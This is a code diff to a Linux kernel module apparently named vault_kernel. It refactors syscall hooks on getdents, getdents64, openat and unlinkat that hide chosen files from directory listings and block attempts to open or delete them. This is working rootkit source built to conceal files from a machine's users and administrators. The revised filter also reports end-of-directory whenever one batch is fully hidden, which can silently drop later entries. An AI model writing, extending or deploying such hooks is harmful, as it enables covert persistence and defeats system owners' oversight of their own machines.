@@ -1,6 +1,6 @@
 /* vault_kernel - file_hide.c
  * File and directory hiding via getdents/getdents64 hook
- * Also protects hidden files from openat
+ * Also protects hidden files from openat/unlinkat
  * ruby570bocadito © 2026
  */
 #include "core.h"
@@ -67,19 +67,55 @@ int is_file_hidden(const char *name) {
 }
 
 /* ================================================================
+ * Directory buffer filtering
+ *
+ * Both struct linux_dirent and struct linux_dirent64 keep
+ * d_reclen at byte offset 16 (d_ino 8 + d_off 8 on x86_64), but
+ * their d_name offset differs (d_type sits between reclen and
+ * name only in the 64-bit variant), hence the name_off argument.
+ *
+ * Hidden entries are absorbed into the PREVIOUS kept entry by
+ * growing its d_reclen.  The caller must treat a return value of
+ * 0 as "every entry in this batch was hidden" and report EOF.
+ * ================================================================ */
+static long filter_dirents(void *kdirp, long ret, size_t name_off) {
+    char *cur = (char *)kdirp;
+    char *end = (char *)kdirp + ret;
+    char *keep = NULL;      /* last kept entry */
+    long bytes = 0;
+
+    while (cur < end) {
+        unsigned short reclen = *(unsigned short *)(cur + 16);
+        const char *name = cur + name_off;
+
+        if (should_hide_file(name)) {
+            if (keep)
+                *(unsigned short *)(keep + 16) += reclen;
+            cur += reclen;
+            continue;
+        }
+
+        bytes += reclen;
+        keep = cur;
+        cur += reclen;
+    }
+
+    return bytes;
+}
+
+/* ================================================================
  * getdents64 hook — filter directory listing
  * ================================================================ */
-asmlinkage long hooked_getdents64(unsigned int fd,
-                                   struct linux_dirent64 __user *dirp,
-                                   unsigned int count) {
-    long ret, bytes_copied;
-    struct linux_dirent64 *kdirp, *entry, *prev;
-    unsigned short reclen;
+asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
+    long (*orig_getdents64)(const struct pt_regs *);
+    char __user *dirp = (char __user *)regs->si;
+    void *kdirp;
+    long ret, kept;
 
-    long (*orig_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);
     orig_getdents64 = (void *)hooks[HOOKIDX_GETDENTS64].original;
 
-    ret = orig_getdents64(fd, dirp, count);
+    /* Run the real syscall first — it fills the user buffer */
+    ret = orig_getdents64(regs);
     if (ret <= 0)
         return ret;
 
@@ -92,38 +128,20 @@ asmlinkage long hooked_getdents64(unsigned int fd,
         return ret;
     }
 
-    bytes_copied = 0;
-    entry = kdirp;
-    prev = NULL;
+    kept = filter_dirents(kdirp, ret, offsetof(struct linux_dirent64, d_name));
 
-    while ((void *)entry < (void *)kdirp + ret) {
-        reclen = entry->d_reclen;
-
-        if (should_hide_file(entry->d_name)) {
-            /* Remove this entry */
-            if (prev) {
-                prev->d_reclen += reclen;
-            }
-            entry = (struct linux_dirent64 *)((char *)entry + reclen);
-            continue;
-        }
-
-        bytes_copied += reclen;
-        prev = entry;
-        entry = (struct linux_dirent64 *)((char *)entry + reclen);
-    }
-
-    if (bytes_copied > 0 && bytes_copied < ret) {
-        /* Set last entry d_reclen to consume remaining buffer */
-        if (prev) {
-            prev->d_reclen += (ret - bytes_copied);
-        }
-        ret = bytes_copied;
-    }
-
-    if (copy_to_user(dirp, kdirp, ret)) {
+    if (kept == 0) {
+        /* Every entry in this batch is hidden — report EOF */
         kfree(kdirp);
-        return -EFAULT;
+        return 0;
+    }
+
+    if (kept < ret) {
+        if (copy_to_user(dirp, kdirp, kept)) {
+            kfree(kdirp);
+            return -EFAULT;
+        }
+        ret = kept;
     }
 
     kfree(kdirp);
@@ -133,17 +151,15 @@ asmlinkage long hooked_getdents64(unsigned int fd,
 /* ================================================================
  * getdents (32-bit compat) hook
  * ================================================================ */
-asmlinkage long hooked_getdents(unsigned int fd,
-                                  struct linux_dirent __user *dirp,
-                                  unsigned int count) {
-    long ret, bytes_copied;
-    struct linux_dirent *kdirp, *entry, *prev;
-    unsigned short reclen;
+asmlinkage long hooked_getdents(const struct pt_regs *regs) {
+    long (*orig_getdents)(const struct pt_regs *);
+    char __user *dirp = (char __user *)regs->si;
+    void *kdirp;
+    long ret, kept;
 
-    long (*orig_getdents)(unsigned int, struct linux_dirent __user *, unsigned int);
     orig_getdents = (void *)hooks[HOOKIDX_GETDENTS].original;
 
-    ret = orig_getdents(fd, dirp, count);
+    ret = orig_getdents(regs);
     if (ret <= 0)
         return ret;
 
@@ -156,35 +172,19 @@ asmlinkage long hooked_getdents(unsigned int fd,
         return ret;
     }
 
-    bytes_copied = 0;
-    entry = kdirp;
-    prev = NULL;
+    kept = filter_dirents(kdirp, ret, offsetof(struct linux_dirent, d_name));
 
-    while ((void *)entry < (void *)kdirp + ret) {
-        reclen = entry->d_reclen;
-
-        if (should_hide_file(entry->d_name)) {
-            if (prev) {
-                prev->d_reclen += reclen;
-            }
-            entry = (struct linux_dirent *)((char *)entry + reclen);
-            continue;
-        }
-
-        bytes_copied += reclen;
-        prev = entry;
-        entry = (struct linux_dirent *)((char *)entry + reclen);
-    }
-
-    if (bytes_copied > 0 && bytes_copied < ret) {
-        if (prev)
-            prev->d_reclen += (ret - bytes_copied);
-        ret = bytes_copied;
-    }
-
-    if (copy_to_user(dirp, kdirp, ret)) {
+    if (kept == 0) {
         kfree(kdirp);
-        return -EFAULT;
+        return 0;
+    }
+
+    if (kept < ret) {
+        if (copy_to_user(dirp, kdirp, kept)) {
+            kfree(kdirp);
+            return -EFAULT;
+        }
+        ret = kept;
     }
 
     kfree(kdirp);
@@ -194,12 +194,12 @@ asmlinkage long hooked_getdents(unsigned int fd,
 /* ================================================================
  * openat hook — block access to hidden files
  * ================================================================ */
-asmlinkage long hooked_openat(int dirfd, const char __user *pathname,
-                               int flags, umode_t mode) {
+asmlinkage long hooked_openat(const struct pt_regs *regs) {
+    long (*orig_openat)(const struct pt_regs *);
+    const char __user *pathname = (const char __user *)regs->si;
     char kpath[256];
     char *filename;
 
-    long (*orig_openat)(int, const char __user *, int, umode_t);
     orig_openat = (void *)hooks[HOOKIDX_OPENAT].original;
 
     if (pathname) {
@@ -218,18 +218,18 @@ asmlinkage long hooked_openat(int dirfd, const char __user *pathname,
         }
     }
 
-    return orig_openat(dirfd, pathname, flags, mode);
+    return orig_openat(regs);
 }
 
 /* ================================================================
  * unlinkat hook — prevent deletion of hidden files
  * ================================================================ */
-asmlinkage long hooked_unlinkat(int dirfd, const char __user *pathname,
-                                  int flags) {
+asmlinkage long hooked_unlinkat(const struct pt_regs *regs) {
+    long (*orig_unlinkat)(const struct pt_regs *);
+    const char __user *pathname = (const char __user *)regs->si;
     char kpath[256];
     char *filename;
 
-    long (*orig_unlinkat)(int, const char __user *, int);
     orig_unlinkat = (void *)hooks[HOOKIDX_UNLINKAT].original;
 
     if (pathname) {
@@ -244,7 +244,7 @@ asmlinkage long hooked_unlinkat(int dirfd, const char __user *pathname,
         }
     }
 
-    return orig_unlinkat(dirfd, pathname, flags);
+    return orig_unlinkat(regs);
 }
 
 int file_hide_init(void) {
